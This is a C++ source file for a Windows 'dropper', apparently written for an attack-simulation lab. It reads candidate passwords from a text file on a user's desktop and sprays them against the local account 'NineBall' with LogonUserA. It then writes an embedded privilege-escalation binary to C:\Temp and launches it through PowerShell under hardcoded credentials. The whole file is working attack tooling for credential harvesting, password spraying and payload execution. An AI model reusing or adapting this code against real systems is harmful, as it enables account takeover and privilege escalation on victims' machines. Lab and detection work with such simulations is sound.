#include "dropper.hpp"

int wmain() {
	Log("[+] Starting dropper.", "dropper");

	// TODO: simulate attacker looking for password docs with powershell

	// read passwords in doc
	Log("[+] Reading password doc.", "dropper");
	std::ifstream file;
	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
	std::vector<std::string> passList;
	std::string pass;

	if (file.is_open()) {
		std::string s;
		while (std::getline(file, s)) {
			passList.push_back(s.substr(s.find(":") + 2));
		}
	}
	file.close();

	// attempt to authenticate as NineBall with passwords
	Log("[+] Starting password spray.", "dropper");
	HANDLE hToken = NULL;
	for (std::string s : passList) {
		Log("  [*] Trying password \"" + s + "\"", "dropper");
		if (LogonUserA(
			"NineBall",
			".",
			s.c_str(),
			LOGON32_LOGON_NETWORK,
			LOGON32_PROVIDER_DEFAULT,
			&hToken
		)) {
			pass = s;
			break;
		}
	}

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
		Log("[!] Failed to get NineBall token" + std::to_string(GetLastError()), "dropper");
	}

	Log("[*] Valid password: \"" + pass + "\"", "dropper");

	// write the privesc to disk
	Log("[+] Writing privesc to disk.", "dropper");
	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
	outfile.write(&privesc[0], sizeof(privesc));
	outfile.close();

	// create privesc process as NineBall
	Log("[+] Starting privesc.", "dropper");
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	std::wstring cmd = 
		L"powershell.exe -Command "
		L"$username = 'NineBall'; "
		L"$password = 'SuperSecurePassword1!'; "
		L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
		L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
		L"Start-Process C:\\Temp\\privesc.exe -Credential $credential;";

	if (!CreateProcessW(
		NULL,
		const_cast<LPWSTR>(cmd.c_str()),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), "dropper");
	}
	else {
		Log("[+] Successfully created privesc process.", "dropper");
	}

	// unsure if these will cause dropper to stay up
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	// keep window open for testing
	int x;
	std::cin >> x;

	return 0;
}